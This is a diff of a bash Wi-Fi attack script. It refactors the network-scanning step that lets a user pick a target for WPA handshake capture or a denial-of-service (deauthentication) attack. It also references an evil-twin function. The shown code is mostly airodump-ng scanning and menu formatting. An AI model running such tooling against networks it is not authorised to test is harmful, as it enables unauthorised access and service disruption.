@@ -157,8 +157,14 @@ updatepackages() {
 	fi
 
 }
-ntwk() {
-	xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
+
+handshake_ataque() {
+	clear
+	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
+	clear
+	sleep 1
+ 	tput cnorm
+    xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
 	xtermnet=$!
 	sleep 3; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
 	echo -e "${blueColour}->->->->-> Select a network <-<-<-<-<-${endColour}\n\n\n"
@@ -171,15 +177,6 @@ ntwk() {
 
 	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
 	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
-}
-
-handshake_ataque() {
-	clear
-	echo -e "\n${turquoiseColour}[*]$grayColour Starting Handshake attack"
-	clear
-	sleep 1
- 	tput cnorm
-    ntwk
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid or Bssid): " && read ap
 	echo -ne "${greenColour}[?]$grayColour What channel is ${ap}?: " && read channel
 	tput civis
@@ -471,7 +468,19 @@ eviltrust() {
 }
 dosattack() {
 	clear; echo -e "\n${blueColourColour}[*]$grayColour Starting DoS attack..."; sleep 2
-	ntwk
+	xterm -e "airodump-ng -w /tmp/xtermNeT --output-format csv ${tar}" &
+	xtermnet=$!
+	sleep 3; kill -9 $xtermnet; wait $xtermnet 2>/dev/null
+	echo -e "${blueColour}->->->->-> Select a network <-<-<-<-<-${endColour}\n\n\n"
+	while IFS= read -r line; do
+		macrepeat=$(grep $line /tmp/xtermNeT-01.csv | wc -l)
+		if [[ "$macrepeat" > 1 ]]; then
+			sed -i "s/${line}/+${line}/" /tmp/xtermNeT-01.csv
+		fi
+	done < <(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1 | sed '/Station/,1d')
+
+	launch_irodump=$(cat /tmp/xtermNeT-01.csv | sed '1,2d' | cut -d "," -f 1,6,4,9,14 | sed 's/,/   /g; /Station/,$d' | sed '$d' | nl -w3 -s "]    " | sed 's/[0-9]/[&/' | sed "s/\[/${rojo}\[${extrojo}/g; s/\]/${rojo}\]${extrojo}/g " | sed 's/WPA2 WPA/WPA2/;s/         -/        -/;s/        -/            -/;s/[0-9][0-9][0-9]    /&-/;s/    -W/   W/g;s/    -        -/           -/g;s/WEP    /WEP     /;s/WEP      /WEP     /; s/WPA    /WPA     /;s/WPA      /WPA     / ; s/OPN    /OPN     /; s/OPN      /OPN     /; s/    $/    (Hidden Wifi)/; s/ -1    (/ -1     (/;s/    ++/    /; s/    +/    /;s/+//g')
+	echo -e "               Bssid          CH    Encry    PWR       Essid\n----------------------------------------------------------------------\n$launch_irodump"
 	echo -ne "\n$greenColour[?]$grayColour Select a network (Essid or Bssid): " && read redos
 	kill -9 $dosairdump_PID; wait $dosairdump_PID 2>/dev/null
 	echo -ne "${redColour}[?]$grayColourChannels Channels for attack (Recommend 1,6,11): " && read canalesdos
